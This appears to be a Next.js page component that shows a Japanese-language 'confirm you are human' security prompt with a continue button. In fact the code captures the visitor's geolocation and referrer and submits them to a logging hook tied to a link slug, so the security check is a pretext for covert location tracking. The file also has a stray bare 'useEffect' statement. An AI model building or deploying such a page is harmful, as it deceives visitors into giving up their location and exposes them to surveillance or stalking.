'use client'

import { useCreateLogHooks } from '@/services/hooks/logger/create-log-hooks'
import { useUserLocation } from '@/services/hooks/logger/user-location-hooks'
import { useParams } from 'next/navigation'
import { useEffect } from 'react'
import { Button } from '@/components/ui/button'

export default function Page() {
  const params = useParams()
  const slug = params.slug as string
  const { formik, isMutating, data } = useCreateLogHooks({ slug: slug })
  const location = useUserLocation()

  useEffect

  useEffect(() => {
    if (location) {
      formik.setFieldValue('latitude', location.latitude)
      formik.setFieldValue('longitude', location.longitude)
    }
    formik.setFieldValue('referer', window.document.referrer || '')
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [location?.latitude, location?.longitude])

  return (
    <main className="flex min-h-screen items-center justify-center px-6">
      <div className="w-full max-w-md rounded-lg border p-6 shadow-sm">
        <h1 className="text-xl font-semibold">
          人間であることを確認してください
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          セキュリティ保護のため、続行前に確認をお願いします。
        </p>

        <form onSubmit={formik.handleSubmit} className="mt-6">
          <Button type="submit" className="w-full" disabled={isMutating}>
            {isMutating ? '確認中...' : '続行'}
          </Button>
        </form>
      </div>
    </main>
  )
}
